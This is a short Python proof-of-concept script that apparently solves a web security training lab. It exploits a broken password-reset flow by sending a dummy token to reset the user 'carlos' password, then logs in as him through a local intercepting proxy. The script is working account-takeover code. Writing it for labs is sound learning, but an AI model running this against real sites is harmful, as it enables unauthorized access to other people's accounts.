import requests as rs
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable insecure request warning

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}


def access_carlos_account(s , url):
    # reset carlos password
    sys.stdout.write("Resetting carlos password...\n")
    reset_password_url = url + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {
        "temp-forgot-password-token": "x",
        "username":"carlos",
        "new-password-1":"hello1",
        "new-password-2":"hello1"
    }

    r = s.post(
        reset_password_url,
        data=password_reset_data,
        proxies=proxies,
        verify=False
    )


    sys.stdout.write("Login into carlos account...\n")
    
    login_url = url + '/login'
    login_data = {
        'username' : 'carlos' ,
        'password' : 'hello1' 
    }


    r = s.post(
        login_url,
        data=login_data,
        proxies=proxies,
        verify=False
    )

    # debug - show status and response snippet 
    # sys.stdout.write(f"[DEBUG] Status: {r.status_code}\n")
    # sys.stdout.write(f"[DEBUG] Response snippet: {r.text[:300]}\n")

    # confirm exploit work
    if "Log out" in r.text:
        sys.stdout.write("Lab solved successfully\n")
        sys.stdout.write(f"Carlos password changed to: {login_data['password']}\n")
    else:
        sys.stdout.write("Lab not solved\n")
        sys.exit(1)

    
def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage : python3 poc.py <url>\n")
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]
    access_carlos_account(s , url)
    

if __name__ == "__main__":
    main()